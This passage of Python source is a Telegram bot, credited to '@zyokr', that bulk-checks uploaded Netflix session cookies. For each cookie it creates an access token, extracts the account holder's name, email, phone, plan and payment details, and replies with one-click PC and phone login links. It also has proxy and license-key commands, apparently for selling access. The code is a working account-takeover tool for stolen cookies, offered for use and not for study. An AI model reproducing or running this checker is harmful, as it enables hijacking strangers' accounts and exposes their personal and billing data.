        loop = asyncio.get_running_loop()

        for idx, (display_name, cookie_raw) in enumerate(cookie_queue, start=1):
            if cancel_bulk_event.is_set():
                break

            if idx % 3 == 0 or idx == total_cookies:
                try:
                    await status_msg.edit_text(
                        f"🔄 Checking Cookies...\n\n"
                        f"📦 File: `{filename}`\n"
                        f"📊 Progress: {idx}/{total_cookies}\n"
                        f"🟢 Valid: {valid_count} | 🔴 Dead: {dead_count}",
                        parse_mode="Markdown"
                    )
                except Exception:
                    pass

            cookie_header = _build_cookie_header(cookie_raw)
            if not cookie_header:
                dead_count += 1
                continue

            ok, detail, nftoken = await loop.run_in_executor(None, _generate_nftoken, cookie_header)
            if ok and nftoken:
                acct = await loop.run_in_executor(None, _check_netflix_cookie, cookie_header)
                acct["source_tag"] = display_name
                acct["nftoken"] = nftoken
                valid_count += 1
                valid_accounts_list.append(acct)
            else:
                dead_count += 1

        await status_msg.edit_text(
            f"✅ **Check Completed!**\n\n"
            f"📊 Total: {total_cookies}\n"
            f"🟢 Valid: {valid_count}\n"
            f"🔴 Dead: {dead_count}",
            parse_mode="Markdown"
        )

        # OUTPUT DECISION: Single vs. Bulk Results
        # OUTPUT DECISION: Single vs. Bulk Results
        if len(valid_accounts_list) == 1:
            acct = valid_accounts_list[0]
            nftoken = acct.get("nftoken", "")
            desktop_link = f"https://www.netflix.com/browse?nftoken={nftoken}" if nftoken else "N/A"
            phone_link = f"https://www.netflix.com/unsupported?nftoken={nftoken}" if nftoken else "N/A"

            card_text = (
                f"📁 <b>Source:</b> <code>{html.escape(acct.get('source_tag', filename))}</code>\n"
                f"✅ <b>Status:</b> Valid Account\n\n"
                f"👤 <b>Account Details:</b>\n"
                f"• <b>Name:</b> {html.escape(acct.get('name', 'Unknown'))}\n"
                f"• <b>Email:</b> {html.escape(acct.get('email', 'Unknown'))}\n"
                f"• <b>Country:</b> {html.escape(acct.get('country', 'Unknown'))}\n"
                f"• <b>Plan:</b> {html.escape(acct.get('plan', 'Unknown'))}\n"
                f"• <b>Price:</b> {html.escape(acct.get('plan_price', 'N/A'))}\n"
                f"• <b>Member Since:</b> {html.escape(acct.get('member_since', 'Unknown'))}\n"
                f"• <b>Next Billing:</b> {html.escape(acct.get('next_billing', 'Unknown'))}\n"
                f"• <b>Payment Method:</b> {html.escape(acct.get('payment_method', 'CC'))}\n"
                f"• <b>Payment Status:</b> {html.escape(acct.get('payment_status', 'Active / Paid'))}\n"
                f"• <b>Phone:</b> {html.escape(acct.get('phone', 'N/A'))}\n"
                f"• <b>Quality:</b> {html.escape(acct.get('video_quality', 'HD'))}\n"
                f"• <b>Streams:</b> {html.escape(acct.get('max_streams', '2'))}\n"
                f"• <b>Profiles:</b> {html.escape(acct.get('profiles', 'Unknown'))}\n\n"
                f"🦖 Bot by @zyokr"
            )

            markup = InlineKeyboardMarkup([[
                InlineKeyboardButton("💻 PC Login", url=desktop_link),
                InlineKeyboardButton("📱 Phone Login", url=phone_link)
            ]]) if nftoken else None

            await update.message.reply_text(card_text, reply_markup=markup, parse_mode="HTML")

        elif len(valid_accounts_list) > 1:
            report_filename = f"results_{os.path.splitext(filename)[0]}.txt"
            report_path = os.path.join(temp_dir, report_filename)
            with open(report_path, "w", encoding="utf-8") as rf:
                rf.write(_generate_results_txt(valid_accounts_list, filename))
            with open(report_path, "rb") as doc_file:
                await update.message.reply_document(
                    document=doc_file,
                    filename=report_filename,
                    caption=f"📄 <b>Results Summary</b> ({len(valid_accounts_list)} accounts found)",
                    parse_mode="HTML"
                )
    except Exception as e:
        await status_msg.edit_text(f"❌ Error: {e}")
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)

# ========== MAIN ENTRY POINT ==========
def run_bot_in_thread():
    global application
    if not BOT_TOKEN:
        return
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        application = ApplicationBuilder().token(BOT_TOKEN).concurrent_updates(True).build()
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(CommandHandler("addproxy", addproxy_command))
        application.add_handler(CommandHandler("stop", stop_command, block=False))
        application.add_handler(CommandHandler("approve", approve_command))
        application.add_handler(CommandHandler("disapprove", disapprove_command))
        application.add_handler(CommandHandler("approved", approved_list_command))
        application.add_handler(CommandHandler("genkey", genkey_command))
        application.add_handler(CommandHandler("redeem", redeem_command))
        application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_cookie_text))

        loop.run_until_complete(application.run_polling(allowed_updates=Update.ALL_TYPES, stop_signals=()))
    except Exception as e:
        logger.error(f"Bot runtime error: {e}")
    finally:
        loop.close()

if __name__ == "__main__":
    if not BOT_TOKEN:
        sys.exit(1)
    bot_thread = Thread(target=run_bot_in_thread, daemon=True)
    bot_thread.start()
    time.sleep(2)
    try:
        app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)
    except (KeyboardInterrupt, SystemExit):
        sys.exit(0)
